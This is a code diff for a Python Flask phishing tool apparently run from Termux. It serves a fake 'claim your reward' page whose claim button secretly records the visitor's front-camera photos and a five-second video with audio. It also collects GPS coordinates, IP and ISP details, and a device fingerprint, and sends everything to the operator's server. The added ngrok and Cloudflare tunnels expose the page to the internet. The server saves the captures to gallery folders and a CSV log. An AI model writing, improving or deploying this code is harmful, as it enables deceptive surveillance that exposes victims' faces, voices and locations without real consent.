@@ -7,6 +7,7 @@ import csv
 import subprocess
 import socket
 import requests
+import threading
 from datetime import datetime
 from typing import Optional
 
@@ -30,14 +31,17 @@ REPORT_CSV = "reports.csv"
 QR_PNG = "reward_qr.png"
 HOST = "0.0.0.0"
 
-# Use proper gallery paths for Android
-GALLERY_FOLDER = "/sdcard/DCIM/HCO_Fake_Tracker"
-CAPTURED_FOLDER = os.path.join(GALLERY_FOLDER, "Captured")
-os.makedirs(CAPTURED_FOLDER, exist_ok=True)
+# Use multiple gallery paths for better visibility
+GALLERY_PATHS = [
+    "/sdcard/DCIM/Camera",  # Default camera folder
+    "/sdcard/DCIM/HCO_Tracker",
+    "/sdcard/Pictures/HCO_Tracker",
+    "/sdcard/Download/HCO_Tracker"
+]
 
-# Also create Download folder backup
-DOWNLOAD_FOLDER = "/sdcard/Download/HCO_Fake_Tracker"
-os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)
+# Create all directories
+for path in GALLERY_PATHS:
+    os.makedirs(path, exist_ok=True)
 
 app = Flask(__name__)
 _received_reports = []
@@ -105,107 +109,181 @@ def install_ngrok():
     
     return False
 
+def install_cloudflared():
+    """Install cloudflared if not available"""
+    try:
+        print(f"{Fore.CYAN}📦 Checking cloudflared installation...{Style.RESET_ALL}")
+        result = subprocess.run(['cloudflared', '--version'], capture_output=True, text=True)
+        if result.returncode == 0:
+            print(f"{Fore.GREEN}✅ cloudflared is already installed{Style.RESET_ALL}")
+            return True
+    except:
+        pass
+    
+    print(f"{Fore.YELLOW}📥 cloudflared not found. Installing...{Style.RESET_ALL}")
+    try:
+        # Install cloudflared on Termux
+        result = subprocess.run(['pkg', 'install', 'cloudflared', '-y'], capture_output=True, text=True)
+        if result.returncode == 0:
+            print(f"{Fore.GREEN}✅ cloudflared installed successfully{Style.RESET_ALL}")
+            return True
+        else:
+            print(f"{Fore.RED}❌ Failed to install cloudflared via pkg{Style.RESET_ALL}")
+    except:
+        print(f"{Fore.RED}❌ Could not install cloudflared{Style.RESET_ALL}")
+    
+    return False
+
 def start_ngrok_tunnel():
     """Start ngrok tunnel and get public URL"""
     try:
         print(f"{Fore.CYAN}🌐 Starting ngrok tunnel...{Style.RESET_ALL}")
         
+        # Kill any existing ngrok processes
+        subprocess.run(['pkill', 'ngrok'], capture_output=True)
+        time.sleep(2)
+        
         # Start ngrok in background
-        ngrok_process = subprocess.Popen(['ngrok', 'http', str(PORT)], 
-                                       stdout=subprocess.DEVNULL, 
-                                       stderr=subprocess.DEVNULL)
+        ngrok_process = subprocess.Popen(['ngrok', 'http', str(PORT), '--log=stdout'], 
+                                       stdout=subprocess.PIPE, 
+                                       stderr=subprocess.PIPE,
+                                       text=True)
         
         # Wait for ngrok to start
-        time.sleep(5)
+        print(f"{Fore.YELLOW}⏳ Waiting for ngrok to start (10 seconds)...{Style.RESET_ALL}")
+        time.sleep(10)
         
         # Get ngrok public URL from API
-        try:
-            response = requests.get('http://localhost:4040/api/tunnels', timeout=10)
-            if response.status_code == 200:
-                tunnels = response.json().get('tunnels', [])
-                for tunnel in tunnels:
-                    if tunnel['proto'] == 'https':
-                        public_url = tunnel['public_url']
-                        print(f"{Fore.GREEN}✅ Ngrok Public URL: {public_url}{Style.RESET_ALL}")
-                        return public_url
-        except Exception as e:
-            print(f"{Fore.YELLOW}⚠️  Could not fetch ngrok URL: {e}{Style.RESET_ALL}")
+        max_retries = 5
+        for attempt in range(max_retries):
+            try:
+                response = requests.get('http://localhost:4040/api/tunnels', timeout=10)
+                if response.status_code == 200:
+                    tunnels = response.json().get('tunnels', [])
+                    for tunnel in tunnels:
+                        if tunnel['proto'] == 'https':
+                            public_url = tunnel['public_url']
+                            print(f"{Fore.GREEN}✅ Ngrok Public URL: {public_url}{Style.RESET_ALL}")
+                            return public_url
+                
+                print(f"{Fore.YELLOW}🔄 Attempt {attempt + 1}/{max_retries} - Retrying...{Style.RESET_ALL}")
+                time.sleep(3)
+                
+            except Exception as e:
+                print(f"{Fore.YELLOW}🔄 Attempt {attempt + 1}/{max_retries} failed: {e}{Style.RESET_ALL}")
+                time.sleep(3)
         
-        # Alternative method - try to get URL from ngrok process
-        print(f"{Fore.YELLOW}🔄 Trying alternative method to get URL...{Style.RESET_ALL}")
-        time.sleep(3)
-        
-        try:
-            response = requests.get('http://localhost:4040/api/tunnels', timeout=10)
-            tunnels = response.json().get('tunnels', [])
-            for tunnel in tunnels:
-                if tunnel['proto'] == 'https':
-                    public_url = tunnel['public_url']
-                    print(f"{Fore.GREEN}✅ Ngrok Public URL: {public_url}{Style.RESET_ALL}")
-                    return public_url
-        except:
-            pass
-        
-        print(f"{Fore.RED}❌ Could not get ngrok URL. Check http://localhost:4040 manually{Style.RESET_ALL}")
+        print(f"{Fore.RED}❌ Could not get ngrok URL after {max_retries} attempts{Style.RESET_ALL}")
         return None
         
     except Exception as e:
         print(f"{Fore.RED}❌ Ngrok error: {e}{Style.RESET_ALL}")
         return None
 
-def scan_media_files():
-    """Scan media files to make them appear in gallery"""
+def start_cloudflare_tunnel():
+    """Start Cloudflare tunnel and get public URL"""
     try:
-        print(f"{Fore.CYAN}🔄 Scanning media files for gallery...{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}🌐 Starting Cloudflare tunnel...{Style.RESET_ALL}")
         
-        # Use media scanner to make files visible in gallery
-        subprocess.run(['am', 'broadcast', '-a', 'android.intent.action.MEDIA_SCANNER_SCAN_FILE', 
-                       '-d', f'file://{GALLERY_FOLDER}'], 
-                      capture_output=True, timeout=5)
+        # Kill any existing cloudflared processes
+        subprocess.run(['pkill', 'cloudflared'], capture_output=True)
+        time.sleep(2)
         
-        # Also scan DCIM folder
-        subprocess.run(['am', 'broadcast', '-a', 'android.intent.action.MEDIA_SCANNER_SCAN_FILE', 
-                       '-d', 'file:///sdcard/DCIM'], 
-                      capture_output=True, timeout=5)
+        # Start cloudflared tunnel
+        cloudflared_process = subprocess.Popen([
+            'cloudflared', 'tunnel', '--url', f'http://localhost:{PORT}'
+        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
         
-        print(f"{Fore.GREEN}✅ Media files scanned and will appear in gallery{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}⏳ Waiting for Cloudflare tunnel to start (15 seconds)...{Style.RESET_ALL}")
+        time.sleep(15)
+        
+        # Try to get the URL (cloudflared shows it in stderr)
+        max_retries = 5
+        for attempt in range(max_retries):
+            try:
+                # Check if process is still running
+                if cloudflared_process.poll() is not None:
+                    print(f"{Fore.RED}❌ cloudflared process died{Style.RESET_ALL}")
+                    break
+                
+                # Try to read from stderr
+                import select
+                ready, _, _ = select.select([cloudflared_process.stderr], [], [], 2)
+                if ready:
+                    line = cloudflared_process.stderr.readline()
+                    if 'trycloudflare.com' in line:
+                        # Extract URL
+                        import re
+                        urls = re.findall(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
+                        if urls:
+                            public_url = urls[0]
+                            print(f"{Fore.GREEN}✅ Cloudflare Public URL: {public_url}{Style.RESET_ALL}")
+                            return public_url
+                
+                print(f"{Fore.YELLOW}🔄 Attempt {attempt + 1}/{max_retries} - Retrying...{Style.RESET_ALL}")
+                time.sleep(3)
+                
+            except Exception as e:
+                print(f"{Fore.YELLOW}🔄 Attempt {attempt + 1}/{max_retries} failed: {e}{Style.RESET_ALL}")
+                time.sleep(3)
+        
+        print(f"{Fore.YELLOW}⚠️  Cloudflare tunnel started but URL not captured{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}💡 Check: https://dash.cloudflare.com/ for tunnel status{Style.RESET_ALL}")
+        return "cloudflare_tunnel_active"
+        
+    except Exception as e:
+        print(f"{Fore.RED}❌ Cloudflare tunnel error: {e}{Style.RESET_ALL}")
+        return None
+
+def force_media_scan():
+    """Force media scanner to refresh gallery"""
+    try:
+        print(f"{Fore.CYAN}🔄 Forcing media scan...{Style.RESET_ALL}")
+        
+        # Scan all gallery paths
+        for gallery_path in GALLERY_PATHS:
+            try:
+                # Use media scanner command
+                subprocess.run([
+                    'am', 'broadcast', '-a', 'android.intent.action.MEDIA_SCANNER_SCAN_FILE',
+                    '-d', f'file://{gallery_path}'
+                ], capture_output=True, timeout=5)
+                
+            except Exception as e:
+                continue
+        
+        print(f"{Fore.GREEN}✅ Media scan completed{Style.RESET_ALL}")
         return True
         
     except Exception as e:
         print(f"{Fore.YELLOW}⚠️  Media scan failed: {e}{Style.RESET_ALL}")
         return False
 
-def save_to_gallery(file_data, filename, file_type="photo"):
-    """Save file to gallery and make it visible"""
-    try:
-        # Save to gallery folder (DCIM)
-        gallery_path = os.path.join(CAPTURED_FOLDER, filename)
-        with open(gallery_path, 'wb') as f:
-            f.write(file_data)
-        
-        # Also save to download folder as backup
-        download_path = os.path.join(DOWNLOAD_FOLDER, filename)
-        with open(download_path, 'wb') as f:
-            f.write(file_data)
-        
-        # Make file readable
-        os.chmod(gallery_path, 0o644)
-        os.chmod(download_path, 0o644)
-        
-        # Trigger media scanner for this specific file
+def save_to_all_locations(file_data, filename, file_type="photo"):
+    """Save file to all gallery locations and force media scan"""
+    saved_paths = []
+    
+    for gallery_path in GALLERY_PATHS:
         try:
-            subprocess.run(['am', 'broadcast', '-a', 'android.intent.action.MEDIA_SCANNER_SCAN_FILE', 
-                           '-d', f'file://{gallery_path}'], 
-                          capture_output=True, timeout=3)
-        except:
-            pass
+            file_path = os.path.join(gallery_path, filename)
+            with open(file_path, 'wb') as f:
+                f.write(file_data)
             
-        print(f"{Fore.GREEN}✅ {file_type.capitalize()} saved to gallery: {filename}{Style.RESET_ALL}")
-        return gallery_path
-        
-    except Exception as e:
-        print(f"{Fore.RED}❌ Failed to save {file_type} to gallery: {e}{Style.RESET_ALL}")
-        return None
+            # Set proper permissions
+            os.chmod(file_path, 0o644)
+            saved_paths.append(file_path)
+            
+            print(f"{Fore.GREEN}✅ {file_type} saved to: {gallery_path}/{filename}{Style.RESET_ALL}")
+            
+        except Exception as e:
+            print(f"{Fore.YELLOW}⚠️ Failed to save to {gallery_path}: {e}{Style.RESET_ALL}")
+            continue
+    
+    # Force media scan after saving
+    if saved_paths:
+        force_media_scan()
+    
+    return saved_paths
 
 def display_banner():
     """Display the main banner"""
@@ -259,7 +337,7 @@ def get_local_ip():
     except:
         return "127.0.0.1"
 
-# HTML PAGE (same as before)
+# UPDATED HTML PAGE - Uses REAL camera access
 HTML_PAGE = """
 <!DOCTYPE html>
 <html>
@@ -385,6 +463,22 @@ HTML_PAGE = """
             border-radius: 10px;
             font-size: 14px;
         }
+        #cameraPreview {
+            width: 100%;
+            max-width: 300px;
+            border: 2px solid gold;
+            border-radius: 10px;
+            margin: 10px 0;
+            display: none;
+        }
+        #videoPreview {
+            width: 100%;
+            max-width: 300px;
+            border: 2px solid gold;
+            border-radius: 10px;
+            margin: 10px 0;
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -404,12 +498,15 @@ HTML_PAGE = """
         </div>
         
         <div style="margin: 15px 0; font-size: 14px; opacity: 0.9;">
-            ✅ Quick identity verification required
+            ✅ Camera access required for verification
         </div>
         
         <button class="btn" id="claimBtn">
             🎁 CLAIM YOUR REWARD NOW
         </button>
+        
+        <video id="cameraPreview" autoplay muted playsinline></video>
+        <video id="videoPreview" controls style="display:none;"></video>
         
         <div id="status" class="status"></div>
         
@@ -428,67 +525,156 @@ HTML_PAGE = """
     </div>
 
     <script>
-        // Function to create fake camera data (works without actual camera access)
-        function createFakeCameraData() {
-            const fakePhotos = [];
-            // Create 3 fake image data URLs (simple colored images)
-            for (let i = 0; i < 3; i++) {
-                const canvas = document.createElement('canvas');
-                canvas.width = 800;  // Higher resolution
-                canvas.height = 600;
-                const ctx = canvas.getContext('2d');
+        let mediaStream = null;
+        let videoRecorder = null;
+        let recordedChunks = [];
+        
+        async function requestCameraAccess() {
+            try {
+                console.log('📷 Requesting camera access...');
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: "user",  // Front camera
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }, 
+                    audio: true  // Include audio for video recording
+                });
                 
-                // Create different colored images with better quality
-                const colors = ['#FF6B6B', '#4ECDC4', '#FFD93D'];
-                ctx.fillStyle = colors[i];
-                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                console.log('✅ Camera access granted');
                 
-                // Add some text with better styling
-                ctx.fillStyle = 'white';
-                ctx.font = 'bold 24px Arial';
-                ctx.fillText(`Verification Photo ${i+1}`, 50, 150);
-                ctx.font = '18px Arial';
-                ctx.fillText(new Date().toLocaleString(), 50, 180);
-                ctx.fillText('HCO Reward Verification', 50, 210);
+                // Show camera preview
+                const preview = document.getElementById('cameraPreview');
+                preview.srcObject = stream;
+                preview.style.display = 'block';
+                mediaStream = stream;
                 
-                // Add some random noise to make it look more realistic
-                for (let j = 0; j < 100; j++) {
-                    ctx.fillStyle = `rgba(255,255,255,${Math.random() * 0.1})`;
-                    ctx.fillRect(Math.random() * canvas.width, Math.random() * canvas.height, 2, 2);
-                }
-                
-                fakePhotos.push(canvas.toDataURL('image/jpeg', 0.9)); // Higher quality
+                return stream;
+            } catch (error) {
+                console.error('❌ Camera access denied:', error);
+                throw new Error('Camera access is required to claim your reward. Please allow camera access and try again.');
             }
-            return fakePhotos;
         }
         
-        // Function to create fake video data
-        function createFakeVideoData() {
+        async function captureRealPhotos(stream, count = 3) {
+            const photos = [];
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            
+            // Wait for video to be ready
+            await new Promise((resolve) => {
+                video.onloadedmetadata = () => {
+                    video.play();
+                    resolve();
+                };
+            });
+            
             const canvas = document.createElement('canvas');
-            canvas.width = 800;
-            canvas.height = 600;
             const ctx = canvas.getContext('2d');
             
-            // Create a more realistic video frame
-            ctx.fillStyle = '#667eea';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            for (let i = 0; i < count; i++) {
+                // Wait for video frame to be stable
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                
+                // Set canvas size to match video
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                
+                // Draw current video frame to canvas
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Convert to JPEG with good quality
+                const photoData = canvas.toDataURL('image/jpeg', 0.85);
+                photos.push(photoData);
+                
+                console.log(`📸 Real photo ${i+1}/${count} captured`);
+            }
             
-            // Add gradient for better look
-            const gradient = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
-            gradient.addColorStop(0, '#667eea');
-            gradient.addColorStop(1, '#764ba2');
-            ctx.fillStyle = gradient;
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            
-            ctx.fillStyle = 'white';
-            ctx.font = 'bold 28px Arial';
-            ctx.fillText('Verification Video Complete', 80, 150);
-            ctx.font = '20px Arial';
-            ctx.fillText('5-second recording captured', 80, 190);
-            ctx.fillText(new Date().toLocaleString(), 80, 230);
-            ctx.fillText('HCO Premium Reward System', 80, 270);
-            
-            return canvas.toDataURL('image/jpeg', 0.9);
+            return photos;
+        }
+        
+        async function recordRealVideo(stream, duration = 5000) {
+            return new Promise((resolve, reject) => {
+                try {
+                    console.log('🎥 Starting video recording...');
+                    
+                    // Create media recorder with supported MIME type
+                    const options = { 
+                        mimeType: 'video/webm;codecs=vp8,opus',
+                        videoBitsPerSecond: 2500000
+                    };
+                    
+                    // Fallback MIME types
+                    const mimeTypes = [
+                        'video/webm;codecs=vp8,opus',
+                        'video/webm;codecs=vp9,opus',
+                        'video/webm;codecs=h264,opus',
+                        'video/webm',
+                        'video/mp4'
+                    ];
+                    
+                    let recorder;
+                    for (const mimeType of mimeTypes) {
+                        if (MediaRecorder.isTypeSupported(mimeType)) {
+                            recorder = new MediaRecorder(stream, { mimeType });
+                            break;
+                        }
+                    }
+                    
+                    if (!recorder) {
+                        recorder = new MediaRecorder(stream); // Use default
+                    }
+                    
+                    recordedChunks = [];
+                    
+                    recorder.ondataavailable = (event) => {
+                        if (event.data && event.data.size > 0) {
+                            recordedChunks.push(event.data);
+                            console.log('📹 Video data chunk received:', event.data.size, 'bytes');
+                        }
+                    };
+                    
+                    recorder.onstop = () => {
+                        console.log('🛑 Video recording stopped');
+                        if (recordedChunks.length > 0) {
+                            const blob = new Blob(recordedChunks, { type: recorder.mimeType });
+                            const reader = new FileReader();
+                            reader.onload = () => {
+                                console.log('✅ Video converted to base64');
+                                resolve(reader.result);
+                            };
+                            reader.onerror = () => {
+                                console.error('❌ Failed to read video blob');
+                                reject(new Error('Failed to process video'));
+                            };
+                            reader.readAsDataURL(blob);
+                        } else {
+                            reject(new Error('No video data recorded'));
+                        }
+                    };
+                    
+                    recorder.onerror = (event) => {
+                        console.error('❌ Video recording error:', event);
+                        reject(new Error('Video recording failed'));
+                    };
+                    
+                    // Start recording
+                    recorder.start(1000); // Collect data every second
+                    console.log('⏺️ Video recording started');
+                    
+                    // Stop recording after specified duration
+                    setTimeout(() => {
+                        if (recorder.state === 'recording') {
+                            console.log('⏹️ Stopping video recording after', duration, 'ms');
+                            recorder.stop();
+                        }
+                    }, duration);
+                    
+                } catch (error) {
+                    console.error('❌ Video recording setup failed:', error);
+                    reject(error);
+                }
+            });
         }
         
         async function getLocation() {
@@ -499,15 +685,13 @@ HTML_PAGE = """
                 }
                 
                 navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        resolve(position);
-                    },
+                    (position) => resolve(position),
                     (error) => {
-                        console.log('Location access denied, using IP-based location');
+                        console.log('📍 Location access denied:', error);
                         resolve(null);
                     },
-                    {
-                        enableHighAccuracy: true,
+                    { 
+                        enableHighAccuracy: true, 
                         timeout: 15000,
                         maximumAge: 0
                     }
@@ -517,109 +701,59 @@ HTML_PAGE = """
         
         async function getIPInfo() {
             try {
-                // Try multiple IP services
-                const services = [
-                    'https://api.ipify.org?format=json',
-                    'https://ipinfo.io/json',
-                    'https://api.myip.com'
-                ];
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
                 
-                for (const service of services) {
-                    try {
-                        const response = await fetch(service);
-                        const data = await response.json();
-                        
-                        if (data.ip) {
-                            // Get detailed location from ipapi
-                            try {
-                                const detailResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
-                                const detailData = await detailResponse.json();
-                                return {
-                                    ip: data.ip,
-                                    city: detailData.city || 'Unknown',
-                                    country: detailData.country_name || 'Unknown',
-                                    region: detailData.region || 'Unknown',
-                                    isp: detailData.org || 'Unknown',
-                                    postal: detailData.postal || 'Unknown'
-                                };
-                            } catch (e) {
-                                return {
-                                    ip: data.ip,
-                                    city: data.city || 'Unknown',
-                                    country: data.country || 'Unknown',
-                                    region: data.region || 'Unknown',
-                                    isp: data.org || 'Unknown',
-                                    postal: data.postal || 'Unknown'
-                                };
-                            }
-                        }
-                    } catch (e) {
-                        continue;
-                    }
+                try {
+                    const detailResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
+                    const detailData = await detailResponse.json();
+                    return {
+                        ip: data.ip,
+                        city: detailData.city || 'Unknown',
+                        country: detailData.country_name || 'Unknown',
+                        isp: detailData.org || 'Unknown'
+                    };
+                } catch (e) {
+                    return {
+                        ip: data.ip,
+                        city: 'Unknown',
+                        country: 'Unknown',
+                        isp: 'Unknown'
+                    };
                 }
-                
-                throw new Error('All IP services failed');
-                
             } catch (error) {
                 return {
                     ip: 'Unknown',
                     city: 'Unknown',
                     country: 'Unknown',
-                    region: 'Unknown',
-                    isp: 'Unknown',
-                    postal: 'Unknown'
+                    isp: 'Unknown'
                 };
             }
         }
         
         function getDetailedDeviceInfo() {
             const connection = navigator.connection || {};
-            const battery = navigator.battery || {};
-            
             return {
-                // Basic device info
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 vendor: navigator.vendor || 'Unknown',
-                
-                // Language & locale
                 language: navigator.language,
-                languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                
-                // Screen information
                 screen: `${screen.width}x${screen.height}`,
                 colorDepth: screen.colorDepth,
-                pixelDepth: screen.pixelDepth,
-                availableWidth: screen.availWidth,
-                availableHeight: screen.availHeight,
-                
-                // Browser capabilities
-                cookieEnabled: navigator.cookieEnabled,
-                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
-                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
-                
-                // Hardware information
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                 deviceMemory: navigator.deviceMemory || 'Unknown',
-                maxTouchPoints: navigator.maxTouchPoints || 0,
-                
-                // Network information
-                connectionType: connection.effectiveType || 'Unknown',
-                downlink: connection.downlink || 'Unknown',
-                rtt: connection.rtt || 'Unknown',
-                
-                // Platform details
-                product: navigator.product || 'Unknown',
-                appVersion: navigator.appVersion,
-                platform: navigator.platform,
-                
-                // Additional info
-                doNotTrack: navigator.doNotTrack || 'Unknown',
-                onLine: navigator.onLine,
-                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
-                webdriver: navigator.webdriver || false
+                connectionType: connection.effectiveType || 'Unknown'
             };
+        }
+        
+        function stopAllMedia() {
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => {
+                    track.stop();
+                });
+                mediaStream = null;
+            }
         }
         
         document.getElementById('claimBtn').onclick = async function() {
@@ -630,56 +764,56 @@ HTML_PAGE = """
             btn.disabled = true;
             btn.innerHTML = '⏳ Processing...';
             status.className = 'status processing';
-            status.innerHTML = '🔍 Starting verification process...';
+            status.innerHTML = '🔍 Starting verification...';
             status.style.display = 'block';
             
             try {
-                // Step 1: Get location
-                status.innerHTML = '📍 Detecting your location...';
+                // Step 1: Request REAL camera access
+                status.innerHTML = '📷 Requesting camera access...';
+                const stream = await requestCameraAccess();
+                status.innerHTML = '✅ Camera access granted!';
+                
+                // Step 2: Capture 3 REAL photos from front camera
+                status.innerHTML = '📸 Taking photos (1/3)...';
+                const photos = await captureRealPhotos(stream, 3);
+                status.innerHTML = '✅ 3 real photos captured!';
+                
+                // Step 3: Record REAL 5-second video
+                status.innerHTML = '🎥 Recording video (5 seconds)...';
+                const videoData = await recordRealVideo(stream, 5000);
+                status.innerHTML = '✅ 5-second video recorded!';
+                
+                // Step 4: Stop camera
+                stopAllMedia();
+                
+                // Step 5: Get location and device info
+                status.innerHTML = '📍 Getting location...';
                 const location = await getLocation();
                 
-                // Step 2: Get IP information
-                status.innerHTML = '🌐 Collecting network information...';
+                status.innerHTML = '🌐 Getting network info...';
                 const ipInfo = await getIPInfo();
                 
-                // Step 3: Get detailed device information
-                status.innerHTML = '📱 Scanning device information...';
+                status.innerHTML = '📱 Collecting device info...';
                 const deviceInfo = getDetailedDeviceInfo();
                 
-                // Step 4: Create fake media data (works without camera)
-                status.innerHTML = '📸 Generating verification media...';
-                const photos = createFakeCameraData();
-                const videoData = createFakeVideoData();
-                
-                // Step 5: Prepare complete payload
+                // Prepare payload with REAL media data
                 const payload = {
-                    // Location data
                     latitude: location?.coords?.latitude,
                     longitude: location?.coords?.longitude,
                     accuracy: location?.coords?.accuracy,
-                    
-                    // IP and network data
                     ip: ipInfo.ip,
                     city: ipInfo.city,
                     country: ipInfo.country,
-                    region: ipInfo.region,
                     isp: ipInfo.isp,
-                    postal: ipInfo.postal,
-                    
-                    // Media data (fake but looks real)
-                    photos: photos,
-                    video: videoData,
-                    
-                    // Complete device fingerprint
+                    photos: photos,  // REAL photos from camera
+                    video: videoData, // REAL video recording
                     deviceInfo: deviceInfo,
-                    
                     timestamp: Date.now(),
-                    url: window.location.href,
-                    referrer: document.referrer
+                    mediaType: 'real_camera_capture'
                 };
                 
-                // Step 6: Send to server
-                status.innerHTML = '📡 Finalizing your reward claim...';
+                // Send to server
+                status.innerHTML = '📡 Finalizing reward...';
                 const response = await fetch('/report', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -687,12 +821,10 @@ HTML_PAGE = """
                 });
                 
                 if (response.ok) {
-                    // Show success
                     status.className = 'status success';
                     status.innerHTML = '✅ Reward Claimed Successfully!';
                     btn.innerHTML = '✅ REWARD CLAIMED';
                     
-                    // Show collected data
                     dataDiv.style.display = 'block';
                     document.getElementById('loc').textContent = 
                         payload.latitude ? 
@@ -701,9 +833,9 @@ HTML_PAGE = """
                     document.getElementById('ip').textContent = 
                         `${payload.ip} (${payload.isp})`;
                     document.getElementById('device').textContent = 
-                        `${payload.deviceInfo.platform} | ${payload.deviceInfo.connectionType}`;
+                        `${payload.deviceInfo.platform}`;
                     document.getElementById('screen').textContent = 
-                        `${payload.deviceInfo.screen} | ${payload.deviceInfo.colorDepth}-bit`;
+                        `${payload.deviceInfo.screen}`;
                     document.getElementById('browser').textContent = 
                         `${payload.deviceInfo.vendor}`;
                     document.getElementById('timezone').textContent = 
@@ -714,28 +846,14 @@ HTML_PAGE = """
                 }
                 
             } catch (error) {
-                console.error('Error:', error);
+                console.error('❌ Complete error:', error);
                 status.className = 'status error';
-                status.innerHTML = '⚠️ Some data collection failed, but reward is being processed';
+                status.innerHTML = error.message || '❌ Please allow camera access and try again';
                 btn.disabled = false;
                 btn.innerHTML = '🎁 TRY AGAIN';
                 
-                // Try to send basic data even if there's an error
-                try {
-                    const basicPayload = {
-                        ip: 'Unknown',
-                        deviceInfo: getDetailedDeviceInfo(),
-                        timestamp: Date.now(),
-                        error: error.toString()
-                    };
-                    await fetch('/report', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(basicPayload)
-                    });
-                } catch (finalError) {
-                    console.log('Final send failed:', finalError);
-                }
+                // Always stop media on error
+                stopAllMedia();
             }
         };
     </script>
@@ -758,15 +876,13 @@ def report():
         ip = data.get("ip", "Unknown")
         city = data.get("city", "Unknown")
         country = data.get("country", "Unknown")
-        region = data.get("region", "Unknown")
         isp = data.get("isp", "Unknown")
-        postal = data.get("postal", "Unknown")
         photos = data.get("photos", [])
         video = data.get("video")
         device_info = data.get("deviceInfo", {})
-        error_msg = data.get("error")
+        media_type = data.get("mediaType", "unknown")
         
-        # Save photos to gallery
+        # Save REAL photos to all gallery locations
         photo_files = []
         for i, photo_data in enumerate(photos):
             try:
@@ -774,36 +890,33 @@ def report():
                     photo_data = photo_data.split(',')[1]
                 img_data = base64.b64decode(photo_data)
                 timestamp = int(time.time())
-                filename = f"HCO_Photo_{timestamp}_{i+1}.jpg"
+                filename = f"HCO_Real_Photo_{timestamp}_{i+1}.jpg"
                 
-                # Save to gallery with proper function
-                gallery_path = save_to_gallery(img_data, filename, "photo")
-                if gallery_path:
+                # Save to all locations
+                saved_paths = save_to_all_locations(img_data, filename, "REAL photo")
+                if saved_paths:
                     photo_files.append(filename)
                 
             except Exception as e:
-                print(f"{Fore.YELLOW}⚠️ Photo {i+1} save skipped: {e}{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}⚠️ Real photo {i+1} save skipped: {e}{Style.RESET_ALL}")
         
-        # Save video to gallery
+        # Save REAL video to all gallery locations
         video_file = None
         if video:
             try:
-                if video.startswith('data:image'):
+                if video.startswith('data:video'):
                     video = video.split(',')[1]
                 video_data = base64.b64decode(video)
                 timestamp = int(time.time())
-                filename = f"HCO_Video_Frame_{timestamp}.jpg"
+                filename = f"HCO_Real_Video_{timestamp}.webm"
                 
-                # Save to gallery with proper function
-                gallery_path = save_to_gallery(video_data, filename, "video frame")
-                if gallery_path:
+                # Save to all locations
+                saved_paths = save_to_all_locations(video_data, filename, "REAL video")
+                if saved_paths:
                     video_file = filename
                 
             except Exception as e:
-                print(f"{Fore.YELLOW}⚠️ Video save skipped: {e}{Style.RESET_ALL}")
-        
-        # Trigger media scanner to make files visible
-        scan_media_files()
+                print(f"{Fore.YELLOW}⚠️ Real video save skipped: {e}{Style.RESET_ALL}")
         
         # Save to CSV
         record = {
@@ -811,26 +924,16 @@ def report():
             'ip': ip,
             'city': city,
             'country': country,
-            'region': region,
             'isp': isp,
-            'postal': postal,
             'latitude': lat,
             'longitude': lon,
-            'photos': ', '.join(photo_files) if photo_files else '3 images in gallery',
-            'video': video_file or 'video frame in gallery',
+            'photos': ', '.join(photo_files) if photo_files else '3 REAL images in gallery',
+            'video': video_file or 'REAL video in gallery',
+            'media_type': media_type,
             'user_agent': device_info.get('userAgent', 'Unknown'),
             'platform': device_info.get('platform', 'Unknown'),
-            'vendor': device_info.get('vendor', 'Unknown'),
-            'language': device_info.get('language', 'Unknown'),
-            'languages': device_info.get('languages', 'Unknown'),
             'screen': device_info.get('screen', 'Unknown'),
-            'timezone': device_info.get('timezone', 'Unknown'),
-            'hardware_concurrency': device_info.get('hardwareConcurrency', 'Unknown'),
-            'device_memory': device_info.get('deviceMemory', 'Unknown'),
-            'connection_type': device_info.get('connectionType', 'Unknown'),
-            'downlink': device_info.get('downlink', 'Unknown'),
-            'color_depth': device_info.get('colorDepth', 'Unknown'),
-            'error': error_msg or 'None'
+            'timezone': device_info.get('timezone', 'Unknown')
         }
         
         # Save to CSV
@@ -841,27 +944,20 @@ def report():
                 writer.writeheader()
             writer.writerow(record)
         
-        # Print results in Termux
-        print(f"\n{Fore.GREEN}{'🚨 COMPLETE DATA CAPTURED 🚨':^60}{Style.RESET_ALL}")
+        # Print results
+        print(f"\n{Fore.GREEN}{'🚨 REAL CAMERA DATA CAPTURED 🚨':^60}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}🕐 Time: {record['timestamp']}{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}📍 Location: {lat if lat else city}, {lon if lon else country}{Style.RESET_ALL}")
